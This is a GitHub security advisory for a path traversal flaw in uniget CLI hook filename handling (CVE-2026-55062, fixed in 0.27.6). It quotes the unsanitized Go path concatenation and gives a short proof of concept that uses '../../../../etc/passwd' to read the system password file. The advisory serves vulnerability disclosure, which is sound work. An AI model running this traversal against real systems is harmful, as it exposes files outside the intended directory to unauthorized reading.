# [M] uniget CLI has Path Traversal in Hook Files - Directory Escape Vulnerability

## Summary
Severity: Medium
Advisory: GHSA-m6jg-wr9m-cg2f
CVE: CVE-2026-55062
CWE: CWE-22, CWE-23, CWE-36, CWE-73
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-m6jg-wr9m-cg2f
Type: github-advisory

## Affected
- Go: `gitlab.com/uniget-org/cli` — affected >=0 <0.27.6

## Details
### Summary
Path Traversal vulnerability in hook filename handling allows attackers to access and manipulate arbitrary files outside the hooks directory via directory escape sequences like [passwd](vscode-file://vscode-app/app/extra/vscode/resources/app/out/vs/code/electron-browser/workbench/workbench.html).

**Details**
File: [hooks.go](vscode-file://vscode-app/app/extra/vscode/resources/app/out/vs/code/electron-browser/workbench/workbench.html) `Lines 135-160`
```
hookFileName := args[0]  // User input not validated
hookFile = preInstallHooksDir + "/" + hookFileName  // Direct concatenation
```

Hook filenames are concatenated directly without sanitizing ../ sequences, allowing directory traversal.



### PoC
**Step 1:** Set cat as editor
```
export EDITOR="cat"
```
**Step 2:** Read /etc/passwd via path traversal

```
./uniget hooks edit --type=pre-install "../../../../etc/passwd"
```

**Step 3:** Output shows file contents
```
root:x:0:0:root:/root:/bin/bash
daemon:x:2:2:daemon:/sbin:/sbin/nologin
[...]
```

<img width="1014" height="178" alt="image" src="https://github.com/user-attachments/assets/0db0fe7e-533b-4d8e-a346-81886ce866ab" />

## References
- https://github.com/uniget-org/cli/security/advisories/GHSA-m6jg-wr9m-cg2f
- https://github.com/uniget-org/cli/commit/7b4f18a9f00f0955f830c7ccf266ed0de5f9fd91
- https://github.com/uniget-org/cli
- https://github.com/uniget-org/cli/releases/tag/v0.27.6
